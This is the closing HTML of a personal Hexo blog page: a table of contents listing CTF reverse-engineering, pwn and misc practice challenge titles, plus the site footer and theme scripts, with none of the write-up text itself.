                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                        rel="next"
                        href="/2023/09/11/moeCTF20221114/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">moeCTF20221114</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">刷题记录</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NKCTF20230318"><span class="nav-text">NKCTF20230318</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ealier"><span class="nav-text">ealier</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-NKCTF-4%E6%9C%88%E5%9B%9B%E5%91%A8-20230417"><span class="nav-text">CTFSHOW-NKCTF-4月四周-20230417</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E7%99%BD%E7%BB%99"><span class="nav-text">flag白给</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%A6%E4%B8%8D%E5%8F%8A%E6%A0%BC"><span class="nav-text">数学不及格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E9%80%80"><span class="nav-text">签退</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-BUUCTF-20230412"><span class="nav-text">CTFSHOW-BUUCTF-20230412</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CrackRTF"><span class="nav-text">CrackRTF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%8E%A9%E5%AE%B6%E4%BA%BA%E5%9D%87%E5%85%A8%E6%A0%88"><span class="nav-text">CTFSHOW 二进制玩家人均全栈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-9%E6%9C%88%E5%88%B7%E9%A2%98"><span class="nav-text">CTFSHOW-9月刷题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn02"><span class="nav-text">pwn02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn03"><span class="nav-text">pwn03</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-3%E6%9C%88%E5%9B%9B%E5%91%A8-20230320"><span class="nav-text">CTFSHOW-3月四周-20230320</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A6%E7%A9%86%E9%81%97%E4%B9%A6"><span class="nav-text">武穆遗书</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%B1%87%E7%BC%96%E5%92%8C%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0"><span class="nav-text">反汇编和反调试学习</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFSHOW-3%E6%9C%88%E4%B8%89%E5%91%A8-20230316"><span class="nav-text">CTFSHOW-3月三周-20230316</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re3-20230316-17"><span class="nav-text">re3(20230316-17)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mingyue-exe-20230318"><span class="nav-text">mingyue.exe(20230318)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xor%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-text">xor函数的分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#judge%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-text">judge函数的分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re3%E8%BD%A6%E5%B0%BE"><span class="nav-text">re3车尾</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%86%E5%90%915"><span class="nav-text">逆向5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-NKCTF-4%E6%9C%88%E4%BA%94%E5%91%A8"><span class="nav-text">BUUCTF-NKCTF-4月五周</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#earlier"><span class="nav-text">earlier</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-Apr-2023-X-SU%E6%88%98%E9%98%9F2023%E5%BC%80%E5%B1%80%E4%B9%8B%E6%88%98"><span class="nav-text">DASCTF Apr.2023 X SU战队2023开局之战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90%E7%AE%80%E5%8D%95%E3%80%91easyRE"><span class="nav-text">【简单】easyRE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF%E5%B9%B3%E5%8F%B0REVERSE%E5%88%B7%E9%A2%9820230115-md"><span class="nav-text">BUUCTF平台REVERSE刷题20230115.md</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse1"><span class="nav-text">reverse1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ascii%E5%B0%86%E8%8B%B1%E6%96%87%E5%AD%97%E7%AC%A6%E6%8D%A2%E4%B8%BA%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6"><span class="nav-text">利用ascii将英文字符换为数字字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse2"><span class="nav-text">reverse2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%B0%86%E6%8C%87%E5%87%BA%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%88%A9%E7%94%A8ascii%E6%8D%A2%E4%B8%BA%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6"><span class="nav-text">判断将指出的特殊字符利用ascii换为数字字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="nav-text">内涵的软件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90"><span class="nav-text">新年快乐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#upx%E8%84%B1%E5%A3%B3"><span class="nav-text">upx脱壳</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xor"><span class="nav-text">xor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#helloword"><span class="nav-text">helloword</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#apk%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%84%E7%90%86"><span class="nav-text">apk文件的处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse3"><span class="nav-text">reverse3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag"><span class="nav-text">不一样的flag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98"><span class="nav-text">迷宫问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleRev"><span class="nav-text">SimpleRev</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%AB%AF%E5%BA%8F%E9%97%AE%E9%A2%98%E3%80%81%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98"><span class="nav-text">小端序问题、拼接问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86"><span class="nav-text">Java逆向解密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JD-GUI-Java-XOR%E9%80%86%E5%90%91"><span class="nav-text">JD-GUI[Java XOR逆向]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-luck-guy"><span class="nav-text">[GXYCTF2019]luck_guy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-JustRE"><span class="nav-text">[BJDCTF2020]JustRE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%AF%E6%8B%BC%E6%8E%A5%E7%B1%BB%E9%A2%98%E7%9B%AE"><span class="nav-text">纯拼接类题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96"><span class="nav-text">刮开有奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8"><span class="nav-text">简单注册器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-pyre"><span class="nav-text">[GWCTF 2019]pyre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pyd%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98"><span class="nav-text">pyd的逆向题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre"><span class="nav-text">[ACTF新生赛2020]easyre</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#findit"><span class="nav-text">findit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa"><span class="nav-text">rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-rome"><span class="nav-text">[ACTF新生赛2020]rome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CrackRTF-1"><span class="nav-text">CrackRTF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlareOn4-login"><span class="nav-text">[FlareOn4]login</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#M1%E2%80%93%E8%AF%BB%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86"><span class="nav-text">M1–读代码解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#M2%E2%80%93ROT13%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">M2–ROT13的利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE"><span class="nav-text">[2019红帽杯]easyRE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Youngter-drive"><span class="nav-text">Youngter-drive</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%86%8C"><span class="nav-text">相册</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Native-Method"><span class="nav-text">Native Method</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF%E5%B9%B3%E5%8F%B0MISC%E5%88%B7%E9%A2%9820221217"><span class="nav-text">BUUCTF平台MISC刷题20221217</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-text">二维码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#N%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3%E5%86%B3"><span class="nav-text">N种方法解决</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E7%99%BD"><span class="nav-text">大白</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wireshark"><span class="nav-text">wireshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rar"><span class="nav-text">rar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zip%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="nav-text">zip伪加密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E7%9C%9F%E5%81%87%E5%8A%A0%E5%AF%86"><span class="nav-text">识别真假加密</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E5%97%85%E6%8E%A2%E7%9A%84%E6%B5%81%E9%87%8F"><span class="nav-text">被嗅探的流量</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%91%98%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E8%B5%9B"><span class="nav-text">安全测试员职业技能赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01hidden-key"><span class="nav-text">01hidden key</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#02bad-python"><span class="nav-text">02bad python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03ereeee"><span class="nav-text">03ereeee</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">PUJIPUJIPUJI~~~~DA~~~~</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Juana_2u</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
